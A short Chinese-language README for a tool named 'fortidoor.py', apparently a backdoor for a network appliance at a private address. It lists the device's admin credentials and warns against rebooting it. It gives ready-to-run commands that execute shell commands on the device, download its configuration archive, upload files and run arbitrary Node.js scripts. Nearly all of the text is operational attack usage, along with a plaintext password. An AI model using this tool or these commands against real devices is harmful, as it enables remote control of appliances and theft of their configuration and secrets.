### 设备信息

+ web管理后台: https://192.168.1.99/  (`admin`/`admin@123`)

### 注意事项

+ 不要重启设备
+ 不要重启web服务
+ 不要更改web服务的端口等信息

#### 运行环境说明

+ Python：3.8 ~ 3.11版本

#### 脚本运行说明

进入`scripts`目录，运行`fortidoor.py`脚本来进行正向的文件上传、文件下载和`shell`命令执行等功能，无需外连，示例如下。

```shell
# execute shell cmd
$ python3 fortidoor.py -t https://192.168.1.99/ --action shell --cmd "/bin/node -v"

# check files under /data/config
$ python3 fortidoor.py -t https://192.168.1.99/ --action shell --custom_cmd "ls /data/config"

# download file from device
$ python3 fortidoor.py -t https://192.168.1.99/ --action download --rfile /data/config/sys_global.conf.gz

# upload local file to device
$ python3 fortidoor.py -t https://192.168.1.99/ --action upload --lfile ../../a --rfile /tmp/a
```

另外，通过对上述基础功能的封装，`fortidoor.py`脚本还支持直接运行`nodejs`脚本，示例如下。

```shell
$ python3 fortidoor.py -t https://192.168.1.99/ --action nodejs --lfile ../your_nodejs.js
```
